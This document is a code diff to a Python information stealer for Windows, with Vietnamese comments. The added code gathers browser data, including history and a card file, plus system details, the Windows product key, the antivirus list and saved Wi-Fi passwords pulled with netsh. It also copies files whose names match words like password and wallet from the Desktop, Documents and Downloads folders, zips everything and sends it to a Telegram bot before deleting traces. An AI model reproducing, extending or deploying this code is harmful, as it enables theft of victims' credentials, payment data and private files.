@@ -4,13 +4,17 @@ import os
 import random
 import sqlite3
 import threading
-from Crypto.Cipher import AES
-import shutil
+import subprocess
 import zipfile
+import shutil
 import requests
+from Crypto.Cipher import AES
 from typing import Union
 from win32crypt import CryptUnprotectData
+import psutil
+import pycountry
 
+# Telegram configuration
 bot_token = 'token'
 chat_id = 'id'
 
@@ -192,41 +196,199 @@ class Browsers:
             os.path.join(self.temp_path, "Browser", "history.txt"),
             os.path.join(self.temp_path, "Browser", "cc's.txt")
         ]
-        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
-        self.create_zip(file_paths, zip_file_path)
-        self.send_file_to_telegram(zip_file_path)
+        zip_filename = os.path.expanduser("~/browser_data.zip")
+        with zipfile.ZipFile(zip_filename, 'w') as zipf:
+            for file in file_paths:
+                if os.path.isfile(file):
+                    zipf.write(file, arcname=os.path.basename(file))
+
+        with open(zip_filename, 'rb') as f:
+            requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id': chat_id}, files={'document': f})
 
         for file in file_paths:
             if os.path.isfile(file):
                 os.remove(file)
-        if os.path.isfile(zip_file_path):
-            os.remove(zip_file_path)
+        os.remove(zip_filename)
 
-    def create_zip(self, file_paths: list, zip_path: str):
-        with zipfile.ZipFile(zip_path, 'w') as zipf:
-            for file in file_paths:
-                if os.path.isfile(file):
-                    zipf.write(file, os.path.basename(file))
-
-    def send_file_to_telegram(self, file_path: str):
-        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-        with open(file_path, 'rb') as file:
-            response = requests.post(
-                url,
-                files={'document': file},
-                data={'chat_id': chat_id}
-            )
-        return response
-
-    def create_temp(self, _dir: Union[str, os.PathLike] = None):
-        if _dir is None:
-            _dir = os.path.expanduser("~/tmp")
-        if not os.path.exists(_dir):
-            os.makedirs(_dir)
-        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
-        path = os.path.join(_dir, file_name)
-        open(path, "x").close()
-        return path
-
+# Khởi tạo và chạy lớp Browsers
 if __name__ == "__main__":
     Browsers()
+
+class PcInfo:
+    def __init__(self):
+        self.username = "RSPVN"
+        self.get_system_info()
+
+    def get_country_code(self, country_name):
+        try:
+            country = pycountry.countries.lookup(country_name)
+            return str(country.alpha_2).lower()
+        except LookupError:
+            return "white"
+        
+    def get_all_avs(self) -> str:
+        process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
+        if process.returncode == 0:
+            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
+            if len(output) >= 2:
+                output = output[1:]
+                output = [av.strip() for av in output]
+                return ", ".join(output)
+
+    def get_system_info(self):
+        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
+        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
+        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
+        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
+        username = os.getenv("UserName")
+        hostname = os.getenv("COMPUTERNAME")
+        uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"
+
+        try:
+            r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
+            if r["status"] != "success":
+                raise Exception("Failed")
+            country = r["country"]
+            proxy = r["proxy"]
+            ip = r["query"]   
+        except Exception:
+            country = "Failed to get country"
+            proxy = "Failed to get proxy"
+            ip = "Failed to get IP"
+                  
+        _, addrs = next(iter(psutil.net_if_addrs().items()))
+        mac = addrs[0].address
+
+        message = f'''
+**PC Username:** `{username}`
+**PC Name:** `{hostname}`
+**OS:** `{computer_os}`
+**Product Key:** `{product_key}`\n
+**IP:** `{ip}`
+**Country:** `{country}`
+**Proxy:** `{proxy}` if proxy else "None"
+**MAC:** `{mac}`
+**UUID:** `{uuid}`\n
+**CPU:** `{cpu}`
+**GPU:** `{gpu}`
+**RAM:** `{ram}GB`\n
+**Antivirus:** `{self.get_all_avs()}`
+        '''
+
+        self.send_message_to_telegram(message)
+
+    def send_message_to_telegram(self, message: str):
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        response = requests.post(
+            url,
+            data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
+        )
+        return response
+
+# Khởi tạo và chạy lớp PcInfo
+if __name__ == "__main__":
+    PcInfo()
+
+class Wifi:
+    def __init__(self):
+        self.networks = {}
+        self.get_networks()
+        self.send_info_to_telegram()
+
+    def get_networks(self):
+        try:
+            output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
+            profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
+            
+            for profile in profiles:
+                if profile:
+                    profile_info = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
+                    self.networks[profile] = self.extract_password(profile_info)
+        except Exception:
+            pass
+
+    def extract_password(self, profile_info):
+        for line in profile_info.splitlines():
+            if "Key Content" in line:
+                return line.split(":")[1].strip()
+        return "No password found"
+
+    def get_router_ip(self):
+        try:
+            output = subprocess.check_output("ipconfig", encoding='utf-8')
+            router_ip = None
+            is_wifi = False
+            for line in output.splitlines():
+                if "Wireless Network Connection" in line or "Wireless LAN adapter" in line:
+                    is_wifi = True
+                elif is_wifi and "Default Gateway" in line:
+                    router_ip = line.split(":")[1].strip()
+                    break
+            if not router_ip:
+                router_ip = "Failed to get router IP"
+            return router_ip
+        except Exception as e:
+            return f"Error: {str(e)}"
+
+    def send_info_to_telegram(self):
+        router_ip = self.get_router_ip()
+        message = f'''
+**Router IP Address:** `{router_ip}`
+**Saved Wi-Fi Networks:**
+'''
+        if self.networks:
+            for network, password in self.networks.items():
+                message += f"- `{network}`: `{password}`\n"
+        else:
+            message += "No Wi-Fi networks found."
+
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        response = requests.post(
+            url,
+            data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
+        )
+        return response
+
+# Khởi tạo và chạy lớp Wifi
+if __name__ == "__main__":
+    Wifi()
+
+# Các thư mục để tìm kiếm
+search_dirs = [os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"), os.path.expanduser("~/Downloads")]
+
+# Các từ khóa và định dạng tệp cần tìm
+keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup"]
+file_extensions = [".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ods", ".json", ".ppk"]
+exclude_extension = ".lnk"
+
+# Thư mục tạm thời để sao chép tệp
+temp_dir = os.path.expanduser("~/temp_files")
+
+# Tạo thư mục tạm nếu không tồn tại
+if not os.path.exists(temp_dir):
+    os.makedirs(temp_dir)
+
+# Tìm kiếm và sao chép các tệp phù hợp
+for search_dir in search_dirs:
+    for root, dirs, files in os.walk(search_dir):
+        for entry in files:
+            if (any([x in entry.lower() for x in keywords]) or entry.endswith(tuple(file_extensions))) \
+                    and not entry.endswith(exclude_extension):
+                file_path = os.path.join(root, entry)
+                shutil.copy(file_path, temp_dir)
+
+# Tạo tệp zip
+zip_filename = os.path.expanduser("~/files.zip")
+with zipfile.ZipFile(zip_filename, 'w') as zipf:
+    for root, dirs, files in os.walk(temp_dir):
+        for file in files:
+            zipf.write(os.path.join(root, file), arcname=file)
+
+# Gửi tệp zip qua Telegram
+with open(zip_filename, 'rb') as f:
+    requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id': chat_id}, files={'document': f})
+
+# Xóa các tệp tạm và tệp zip sau khi gửi
+shutil.rmtree(temp_dir)
+os.remove(zip_filename)
